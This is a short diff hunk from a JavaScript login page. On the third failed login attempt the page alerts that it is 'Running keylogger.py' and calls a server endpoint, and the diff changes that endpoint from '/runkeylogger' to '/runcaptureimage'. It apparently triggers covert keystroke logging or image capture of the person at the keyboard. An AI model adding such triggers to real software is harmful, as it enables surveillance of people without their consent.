@@ -76,7 +76,7 @@
             if (login_attempts === 3) {
                 alert("Login attempt reached 3. Running keylogger.py");
                 // Make an AJAX request to run keylogger.py
-                $.get('/runkeylogger', function(response) {
+                $.get('/runcaptureimage', function(response) {
                     console.log(response);
                 });
             } else if (login_attempts === 5) {
